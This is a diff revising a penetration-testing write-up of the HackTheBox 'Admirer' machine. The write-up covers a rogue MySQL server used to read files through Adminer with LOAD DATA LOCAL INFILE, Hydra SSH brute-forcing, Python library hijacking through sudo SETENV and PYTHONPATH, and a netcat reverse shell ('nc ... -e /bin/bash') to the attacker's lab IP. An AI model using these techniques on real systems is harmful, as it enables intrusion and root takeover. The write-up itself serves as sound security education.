@@ -248,7 +248,10 @@ To sum all of this up, the easiest way to exploit this portal is to set up a loc
 
 ### The rogue MySQL server
 
-[https://www.liquidweb.com/kb/create-a-mysql-user-on-linux-via-command-line/](https://www.liquidweb.com/kb/create-a-mysql-user-on-linux-via-command-line/) [https://www.liquidweb.com/kb/grant-permissions-to-a-mysql-user-on-linux-via-command-line/](https://www.liquidweb.com/kb/grant-permissions-to-a-mysql-user-on-linux-via-command-line/)
+I did a bit more research to figure out exactly how to set up the MySQL database.  The following articles gave me the last bits of information I didn't already know \(specifically, how to create a user and assign it permissions\).
+
+* [https://www.liquidweb.com/kb/create-a-mysql-user-on-linux-via-command-line/](https://www.liquidweb.com/kb/create-a-mysql-user-on-linux-via-command-line/) 
+* [https://www.liquidweb.com/kb/grant-permissions-to-a-mysql-user-on-linux-via-command-line/](https://www.liquidweb.com/kb/grant-permissions-to-a-mysql-user-on-linux-via-command-line/)
 
 ```text
 zweilos@kali:/etc/mysql/conf.d$ service mysql start
@@ -296,7 +299,7 @@ root@kalimaa:~# exit
 logout
 ```
 
-Next I had to set the binding for the server to port 0.0.0.0 so that the external service could connect to it by my IP. The default is 127.0.0.1 which is localhost only.
+After creating the database and a table called `admirer`, I created a user named `test` and gave it full permissions to manage the database.  
 
 ```text
 zweilos@kali:/etc/mysql/mariadb.conf.d$ ls
@@ -306,18 +309,22 @@ zweilos@kali:/etc/mysql/mariadb.conf.d$ sudo vim 50-server.cnf
 
 ![](../../.gitbook/assets/5.5-config-file.png)
 
+Next I had to set the binding for the server to the address `0.0.0.0` so that the external service could connect to it by my IP.  The default is `127.0.0.1` which is localhost only.
+
 ```text
 zweilos@kali:/etc/mysql/conf.d$ service mysql stop
 zweilos@kali:/etc/mysql/conf.d$ service mysql start
 ```
 
-After changing the server `bind-address` setting to `0.0.0.0` I had to restart the `mysql` service for it to take effect. AFter that I was able to login to my database in the adminer portal.
+After changing the server `bind-address` setting to `0.0.0.0` I had to restart the `mysql` service for it to take effect. After that I was able to login to my database in the Adminer portal.
 
 ![](../../.gitbook/assets/6-adminer-login%20%281%29.png)
 
 ### Finding user creds
 
-[https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f](https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f)
+This bug bounty write-up detailed what I needed to do next. Essentially, I logged into the remote server's database management portal, but it was my own local database that I logged into.  After that, I abused a feature of MySQL that allows for local files to be imported into the database.  This is a type of local file inclusion \(LFI\) vulnerability.  
+
+* [https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f](https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f)
 
 ```text
 LOAD DATA LOCAL INFILE '/etc/passwd' 
@@ -327,15 +334,15 @@ FIELDS TERMINATED BY "\n"
 
 ![](../../.gitbook/assets/7-failed-local-inclusion%20%281%29.png)
 
-To test for the local file inclusion vulnerability I first tried to get `/etc/passwd` but was denied access to that directory. Since I was fairly sure that this was still only running in the context of `www-data` I decided to try to get a file I knew I could access: `index.php`.
+To test for the local file inclusion vulnerability I first tried to get `/etc/passwd` but was denied access to that file. Since I was fairly sure that this portal was still only running in the context of `www-data` I decided to try to get a file I knew I could access: `index.php`.
 
 ![](../../.gitbook/assets/8-local-inclusion-success.png)
 
-I wasn't even sure that this was going to work, but to my surprise it retrieved the file and added it to my database.
+I wasn't even sure that this was going to work, but to my surprise it retrieved the file and added it to my database. I now had a way to read through the source code of the production website as opposed to the backups I downloaded earlier.
 
 ![](../../.gitbook/assets/9-yet-another-password.png)
 
-much to my surprise...there was yet again another password contained in this file. Before trying to download any more files I decided to try to log in with this new password.
+Much to my surprise...there was yet again another password contained in this file. Before trying to download any more files I decided to try to brute force SSH login again with this new password.
 
 ```text
 zweilos@kali:~/htb/admirer$ hydra -L users -P passwords 10.10.10.187 ssh
@@ -351,7 +358,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-04 22:49:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-04 22:50:00
 ```
 
-It looked like I had finally found a usable password for `waldo`!
+I had finally found a usable password for `waldo`!  I hoped that it wouldn't just kick me out like it had with `ftpuser`. 
 
 ### User.txt
 
@@ -375,6 +382,8 @@ waldo@admirer:~$ cat user.txt
 e9d47e5a8ef5972c07c9a8adb1a2af9a
 ```
 
+Luckily it logged me right in, and I was able to collect my hard-earned loot!
+
 ## Path to Power \(Gaining Administrator Access\)
 
 ### Enumeration as user `waldo`
@@ -393,15 +402,220 @@ User waldo may run the following commands on admirer:
     (ALL) SETENV: /opt/scripts/admin_tasks.sh
 ```
 
-hmm I wonder what this script does, and what the group `admins` can access.
+One of the first things I always do when gaining access to a new user is to check what privileges I have with `sudo -l`.  I was pleasantly surprised to get a result back that I was able to do something with a bash script called `admin_tasks.sh`.  I was curious about what this script did, and also what the group `admins` could access.  
 
-inside the script it references a few other files
+```text
+waldo@admirer:~$ find / -group admins 2>/dev/null
+/opt/scripts
+/opt/scripts/backup.py
+/opt/scripts/admin_tasks.sh
+```
+
+Hmm...so the admins group only has access to this `scripts` folder.  Time to check out the bash script.
+
+```bash
+#!/bin/bash
+
+view_uptime()
+{
+    /usr/bin/uptime -p
+}
+
+view_users()
+{
+    /usr/bin/w
+}
+
+view_crontab()
+{
+    /usr/bin/crontab -l
+}
+
+backup_passwd()
+{
+    if [ "$EUID" -eq 0 ]
+    then
+        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
+        /bin/cp /etc/passwd /var/backups/passwd.bak
+        /bin/chown root:root /var/backups/passwd.bak
+        /bin/chmod 600 /var/backups/passwd.bak
+        echo "Done."
+    else
+        echo "Insufficient privileges to perform the selected operation."
+    fi
+}
+
+backup_shadow()
+{
+    if [ "$EUID" -eq 0 ]
+    then
+        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
+        /bin/cp /etc/shadow /var/backups/shadow.bak
+        /bin/chown root:shadow /var/backups/shadow.bak
+        /bin/chmod 600 /var/backups/shadow.bak
+        echo "Done."
+    else
+        echo "Insufficient privileges to perform the selected operation."
+    fi
+}
+
+backup_web()
+{
+    if [ "$EUID" -eq 0 ]
+    then
+        echo "Running backup script in the background, it might take a while..."
+        /opt/scripts/backup.py &
+    else
+        echo "Insufficient privileges to perform the selected operation."
+    fi
+}
+
+backup_db()
+{
+    if [ "$EUID" -eq 0 ]
+    then
+        echo "Running mysqldump in the background, it may take a while..."
+        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
+        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
+    else
+        echo "Insufficient privileges to perform the selected operation."
+    fi
+}
+
+
+
+# Non-interactive way, to be used by the web interface
+if [ $# -eq 1 ]
+then
+    option=$1
+    case $option in
+        1) view_uptime ;;
+        2) view_users ;;
+        3) view_crontab ;;
+        4) backup_passwd ;;
+        5) backup_shadow ;;
+        6) backup_web ;;
+        7) backup_db ;;
+
+        *) echo "Unknown option." >&2
+    esac
+
+    exit 0
+fi
+
+
+# Interactive way, to be called from the command line
+options=("View system uptime"
+         "View logged in users"
+         "View crontab"
+         "Backup passwd file"
+         "Backup shadow file"
+         "Backup web data"
+         "Backup DB"
+         "Quit")
+
+echo
+echo "[[[ System Administration Menu ]]]"
+PS3="Choose an option: "
+COLUMNS=11
+select opt in "${options[@]}"; do
+    case $REPLY in
+        1) view_uptime ; break ;;
+        2) view_users ; break ;;
+        3) view_crontab ; break ;;
+        4) backup_passwd ; break ;;
+        5) backup_shadow ; break ;;
+        6) backup_web ; break ;;
+        7) backup_db ; break ;;
+        8) echo "Bye!" ; break ;;
+
+        *) echo "Unknown option." >&2
+    esac
+done
+
+exit 0
+```
+
+This bash script seemed to be a completed version of the PHP version of admin-tasks I had seen earlier.  Inside the script it references a few other files:
 
 * `/opt/scripts/backup.py`
-* `/srv/ftp/dump.sql` - this is the one we found through the ftp server I think
+* `/srv/ftp/dump.sql` - _this is the one I found through the ftp server I think_
 * `/var/backups/dump.sql`
 
-was able to run the script as root with `sudo /opt/scripts/admin_tasks.sh` and then dump the sql database
+```bash
+waldo@admirer:/opt/scripts$ sudo ./admin_tasks.sh 
+
+[[[ System Administration Menu ]]]
+1) View system uptime
+2) View logged in users
+3) View crontab
+4) Backup passwd file
+5) Backup shadow file
+6) Backup web data
+7) Backup DB
+8) Quit
+Choose an option: 3
+# Edit this file to introduce tasks to be run by cron.
+# 
+# Each task to run has to be defined through a single line
+# indicating with different fields when the task will be run
+# and what command to run for the task
+# 
+# To define the time you can provide concrete values for
+# minute (m), hour (h), day of month (dom), month (mon),
+# and day of week (dow) or use '*' in these fields (for 'any').# 
+# Notice that tasks will be started based on the cron's system
+# daemon's notion of time and timezones.
+# 
+# Output of the crontab jobs (including errors) is sent through
+# email to the user the crontab file belongs to (unless redirected).
+# 
+# For example, you can run a backup of all your user accounts
+# at 5 a.m every week with:
+# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+# 
+# For more information see the manual pages of crontab(5) and cron(8)
+# 
+# m h  dom mon dow   command
+*/3 * * * * rm -r /tmp/*.* >/dev/null 2>&1
+*/3 * * * * rm /home/waldo/*.p* >/dev/null 2>&1
+```
+
+I ran the option for viewing the root crontab and noticed that it was set to clear out files every 3 minutes.  It looked like putting files in `/tmp/` or files with an extension starting in `p` in `waldo`'s home directory would be a short-lived affair.  
+
+```text
+waldo@admirer:/opt/scripts$ ls -la /var/backups/
+total 6472
+drwxr-xr-x  2 root root      4096 Sep 27 23:38 .
+drwxr-xr-x 12 root root      4096 Nov 29  2019 ..
+-rw-r--r--  1 root root     40960 Apr 22 11:32 alternatives.tar.0
+-rw-r--r--  1 root root      2156 Nov 29  2019 alternatives.tar.1.gz
+-rw-r--r--  1 root root     13080 Apr 16 13:29 apt.extended_states.0
+-rw-r--r--  1 root root      1461 Nov 29  2019 apt.extended_states.1.gz
+-rw-r--r--  1 root root       280 Nov 29  2019 dpkg.diversions.0
+-rw-r--r--  1 root root       160 Nov 29  2019 dpkg.diversions.1.gz
+-rw-r--r--  1 root root       160 Nov 29  2019 dpkg.diversions.2.gz
+-rw-r--r--  1 root root       160 Nov 29  2019 dpkg.diversions.3.gz
+-rw-r--r--  1 root root       160 Nov 29  2019 dpkg.diversions.4.gz
+-rw-r--r--  1 root root       218 Nov 29  2019 dpkg.statoverride.0
+-rw-r--r--  1 root root       188 Nov 29  2019 dpkg.statoverride.1.gz
+-rw-r--r--  1 root root       188 Nov 29  2019 dpkg.statoverride.2.gz
+-rw-r--r--  1 root root       188 Nov 29  2019 dpkg.statoverride.3.gz
+-rw-r--r--  1 root root       188 Nov 29  2019 dpkg.statoverride.4.gz
+-rw-r--r--  1 root root    422248 Apr 16 13:30 dpkg.status.0
+-rw-r--r--  1 root root    128737 Apr 16 13:30 dpkg.status.1.gz
+-rw-r--r--  1 root root    128737 Apr 16 13:30 dpkg.status.2.gz
+-rw-r--r--  1 root root    123388 Dec  1  2019 dpkg.status.3.gz
+-rw-r--r--  1 root root    122709 Nov 29  2019 dpkg.status.4.gz
+-rw-r--r--  1 root root      3694 Sep 27 23:38 dump.sql
+-rw-------  1 root root       840 Dec  2  2019 group.bak
+-rw-------  1 root shadow     691 Dec  2  2019 gshadow.bak
+-rw-r--r--  1 root root   5552679 Dec  4  2019 html.tar.gz
+-rw-------  1 root root      1680 Dec  2  2019 passwd.bak
+-rw-------  1 root shadow    1777 Apr 22 11:42 shadow.bak
+```
+
+I was also able to run the script to backup the SQL database, `/etc/passwd`, and `/etc/shadow`. Unfortunately, each of the backup files were owned by `root` so I had no way to read them.  
 
 ```bash
 backup_web()
@@ -416,7 +630,7 @@ backup_web()
 }
 ```
 
-the sql server database backup didn't have any interesting information in it. The file `/opt/scripts/backup.py` contained:
+The one function that looked a bit different from the others was the one that backed up the HTML files for the website.  This one called a separate python script, which would also be run as root, so I decided to check it out as well.
 
 ```python
 !/usr/bin/python3
@@ -433,25 +647,15 @@ dst = '/var/backups/html'
 make_archive(dst, 'gztar', src)
 ```
 
-```text
-waldo@admirer:/home$ ls -la
-total 36
-drwxr-xr-x  9 root       root       4096 Dec  2  2019 .
-drwxr-xr-x 22 root       root       4096 Apr 16 13:30 ..
-drwxr-xr-x  2 amy        amy        4096 Dec  2  2019 amy
-drwxr-xr-x  2 bernadette bernadette 4096 Dec  2  2019 bernadette
-drwxr-xr-x  2 howard     howard     4096 Dec  2  2019 howard
-drwxr-xr-x  2 leonard    leonard    4096 Dec  2  2019 leonard
-drwxr-xr-x  2 penny      penny      4096 Dec  2  2019 penny
-drwxr-xr-x  2 rajesh     rajesh     4096 Dec  2  2019 rajesh
-drwxr-x---  3 waldo      waldo      4096 Apr 29 11:18 waldo
-```
+The file `/opt/scripts/backup.py` that the bash script referenced to do the web backup contained code that seemed potentially useful. 
 
-### Getting a shell
+### SETENV and sudo
 
-I had an idea that since this script was calling another python script as root that maybe I could get it to read a file of my choice, however all of the files referenced in the python script has absolute paths so no no hijacking seemed possible there. I did a search for `sudo setenv python` since I saw in my `sudo -l` output that the word `SETENV` was listed in front of the bash script I could run. In the search results was a very interesting article that talked about hijacking python library imports
+I had an idea that since this python script was being run as root that maybe I could get it to read a file of my choice, however all of the files referenced in the python script has absolute paths so no no hijacking seemed possible there. 
 
-[https://stackoverflow.com/questions/7969540/pythonpath-not-working-for-sudo-on-gnu-linux-works-for-root](https://stackoverflow.com/questions/7969540/pythonpath-not-working-for-sudo-on-gnu-linux-works-for-root) [https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)
+I did some research for `sudo setenv python` since I saw in my `sudo -l` output the word `SETENV` listed in front of the bash script I could run. In the search results was a very interesting article that talked about hijacking python library imports. 
+
+* [https://stackoverflow.com/questions/7969540/pythonpath-not-working-for-sudo-on-gnu-linux-works-for-root](https://stackoverflow.com/questions/7969540/pythonpath-not-working-for-sudo-on-gnu-linux-works-for-root) [https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)
 
 > SCENARIO 3: Redirecting Python Library Search through PYTHONPATH Environment Variable
 >
@@ -464,15 +668,17 @@ This sounded exactly like the situation I had found.
 ```python
 import os
 
-def make_archive(a, b, c):
+def make_archive():
     os.system('/bin/bash')
     os.system('echo I am g`whoami`')
 ```
 
-```text
-waldo@admirer:~$ vi shutil.py 
-waldo@admirer:~$ nano shutil.py
-waldo@admirer:~$ sudo PYTHONPATH=/home/waldo /opt/scripts/admin_tasks.sh 
+Armed with this information, I wrote a short python library to replace the one referenced in the script.  I named it `shutil.py` so the script would call it instead of the real one, and also made a function named `make_archive()` since this was what was specifically being imported.  I wrote my function so that it would create a bash shell, and then echo my new username.  
+
+```python
+waldo@admirer:/dev/shm$ vi shutil.py 
+waldo@admirer:/dev/shm$ nano shutil.py
+waldo@admirer:/dev/shm$ sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh 
 
 [[[ System Administration Menu ]]]
 1) View system uptime
@@ -485,28 +691,30 @@ waldo@admirer:~$ sudo PYTHONPATH=/home/waldo /opt/scripts/admin_tasks.sh
 8) Quit
 Choose an option: 6
 Running backup script in the background, it might take a while...
-waldo@admirer:~$ Traceback (most recent call last):
+waldo@admirer:/dev/shm$ Traceback (most recent call last):
   File "/opt/scripts/backup.py", line 3, in <module>
     from shutil import make_archive
 ImportError: cannot import name 'make_archive'
 whoami
 waldo
-waldo@admirer:~$ nano shutil.py
-waldo@admirer:~$ sudo PYTHONPATH=/home/waldo /opt/scripts/admin_tasks.sh 6
+waldo@admirer:/dev/shm$ nano shutil.py
+waldo@admirer:/dev/shm$ sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh 6
 Running backup script in the background, it might take a while...
-waldo@admirer:~$ Traceback (most recent call last):
+waldo@admirer:/dev/shm$ Traceback (most recent call last):
   File "/opt/scripts/backup.py", line 12, in <module>
     make_archive(dst, 'gztar', src)
 TypeError: make_archive() takes 0 positional arguments but 3 were given
 whoami
 waldo
-waldo@admirer:~$ nano shutil.py
-waldo@admirer:~$ sudo PYTHONPATH=/home/waldo /opt/scripts/admin_tasks.sh 6
+waldo@admirer:/dev/shm$ nano shutil.py
+waldo@admirer:/dev/shm$ sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh 6
 Running backup script in the background, it might take a while...
-waldo@admirer:~$ I am groot
+waldo@admirer:/dev/shm$ I am groot
 ```
 
-After trial and error, I was able to get my library to be loaded, though I did not get a shell like I expected. However, I could see that the output of the `whoami` command did appear, so I had proof that I could run commands as root. I got an error when trying to exploit this with version one of my evil python library, but that error also confirmed that I was making progress. It told me that my "make\_archive\(\)" function takes in 0 positional arguments but the script that was calling it was feeding it three.
+After trial and error, I was able to get my library to be loaded and executed, though I did not get a shell like I expected. However, I could see that the output of the `whoami` command did appear, so I had proof that I could run commands as root. 
+
+I got an error when trying to exploit this with version one of my evil python library, but that error also confirmed that I was making progress. It told me that my `make_archive()` function takes 0 positional arguments but the script that was calling it was feeding it three.
 
 ```python
 import os
@@ -517,13 +725,9 @@ def make_archive(a, b, c):
     os.system('nc 10.10.15.57 12345 -e /bin/bash')
 ```
 
-I modified my function to take 3 arguments, and also send me a reverse shell, and then it worked just fine. I didn't expect the version of `nc` that was installed to have `-e` capability, but I was happy it did!
+I modified my function to take 3 arguments \(which I didn't use for anything\), and also added a line to send me a reverse shell since calling a new shell wasn't working, and then it worked just fine. I didn't expect the version of `nc` that was installed to have `-e` capability, but I was happy it did!
 
-While I was troubleshooting my python module, I noticed my output stopped suddenly. I remembered the cron jobs I had seen earlier, and realized that it had probably deleted my script...
-
-`os.system('cat /etc/shadow')` dont put this in writeup
-
-```text
+```python
 waldo@admirer:/dev/shm$ nano shutil.py 
 waldo@admirer:/dev/shm$ sudo PYTHONPATH=/dev/shm /opt/scripts/admin_tasks.sh 6
 Running backup script in the background, it might take a while...
